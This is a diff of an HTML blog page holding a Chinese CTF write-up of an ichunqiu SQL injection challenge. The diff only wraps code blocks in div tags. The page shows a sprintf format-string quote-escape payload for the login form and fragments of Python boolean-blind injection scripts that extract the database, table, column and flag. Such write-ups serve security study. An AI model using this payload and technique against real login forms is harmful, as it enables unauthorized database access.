@@ -225,7 +225,7 @@
 <p>SQLi(ichunqiu)<br>收获颇多的一道题<br>进入就是登录界面，尝试admin为用户名一次就对，想着直接爆破结果失败了。发现回显只有username error!以及password error!两种，bool盲注<br>先试试过滤点，发现后缀是%时报错时sprintf参数问题，查找关于sprintf的漏洞找到这篇<a href="https://zhuanlan.zhihu.com/p/115777073" target="_blank" rel="noopener">文章</a><br>应该就是单引号逃逸闭合来注入<br>构造payload:  </p>
 <ul>
 <li>admin%1$\’ or 1=1— 回显password error!</li>
-<li>admin%1$\’ or 1=2— 回显username error!<br>可见可以通过or后面表达式的布尔值真假进行bool盲注<pre><code class="hljs go"><span class="hljs-keyword">import</span> requests
+<li>admin%1$\’ or 1=2— 回显username error!<br>可见可以通过or后面表达式的布尔值真假进行bool盲注<div class="hljs"><pre><code class="hljs go"><span class="hljs-keyword">import</span> requests
 
 <span class="hljs-keyword">import</span> <span class="hljs-keyword">string</span>
 
@@ -248,8 +248,8 @@ right =  <span class="hljs-string">"password error!"</span>
 	<span class="hljs-keyword">if</span> right in response:
 
 		<span class="hljs-built_in">print</span>(<span class="hljs-string">"the length of database_name is"</span>+str(i))
-		<span class="hljs-keyword">break</span></code></pre>
-<pre><code class="hljs routeros"><span class="hljs-comment">#爆数据库---ctf</span>
+		<span class="hljs-keyword">break</span></code></pre></div>
+<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-comment">#爆数据库---ctf</span>
 
 database_name = <span class="hljs-string">''</span>
 
@@ -273,8 +273,8 @@ database_name = <span class="hljs-string">''</span>
 
 			break
 
-<span class="hljs-builtin-name">print</span>(database_name)</code></pre>
-<pre><code class="hljs sql"><span class="hljs-comment">#爆表长度----4</span>
+<span class="hljs-builtin-name">print</span>(database_name)</code></pre></div>
+<div class="hljs"><pre><code class="hljs sql"><span class="hljs-comment">#爆表长度----4</span>
 <span class="hljs-comment">#试着数据库名写成'ctf'发现不行，ctf写成asciihex编码形式0x637466成功注入</span>
 <span class="hljs-comment">#注意使用limit 0,1限定查询</span>
 
@@ -294,8 +294,8 @@ for i in range(30):
 
 		print(<span class="hljs-string">"------------------"</span>+<span class="hljs-keyword">str</span>(i))
 
-		break</code></pre>
-<pre><code class="hljs sql"><span class="hljs-comment">#爆表名----flag</span>
+		break</code></pre></div>
+<div class="hljs"><pre><code class="hljs sql"><span class="hljs-comment">#爆表名----flag</span>
 
 table_name = ''
 
@@ -319,8 +319,8 @@ for i in range(1,5):
 
 		break
 
-print(table_name)</code></pre>
-<pre><code class="hljs sql"><span class="hljs-comment">#爆列长度---4</span>
+print(table_name)</code></pre></div>
+<div class="hljs"><pre><code class="hljs sql"><span class="hljs-comment">#爆列长度---4</span>
 
 for i in range(30):
 
@@ -336,8 +336,8 @@ for i in range(30):
 
 		print(<span class="hljs-string">"--------------------"</span>+<span class="hljs-keyword">str</span>(i))
 
-		break</code></pre>
-<pre><code class="hljs routeros"><span class="hljs-comment">#爆列名---flag</span>
+		break</code></pre></div>
+<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-comment">#爆列名---flag</span>
 
 column_name = <span class="hljs-string">''</span>
 
@@ -361,8 +361,8 @@ column_name = <span class="hljs-string">''</span>
 
 			break
 
-<span class="hljs-builtin-name">print</span>(column_name)</code></pre>
-<pre><code class="hljs routeros"><span class="hljs-comment">#爆flag</span>
+<span class="hljs-builtin-name">print</span>(column_name)</code></pre></div>
+<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-comment">#爆flag</span>
 <span class="hljs-comment">#懒得爆长度了，直接上</span>
 
 <span class="hljs-attribute">flag</span>=<span class="hljs-string">''</span>
@@ -391,7 +391,7 @@ column_name = <span class="hljs-string">''</span>
 
 			break
 
-<span class="hljs-builtin-name">print</span>(flag)</code></pre>
+<span class="hljs-builtin-name">print</span>(flag)</code></pre></div>
 </li>
 </ul>
 
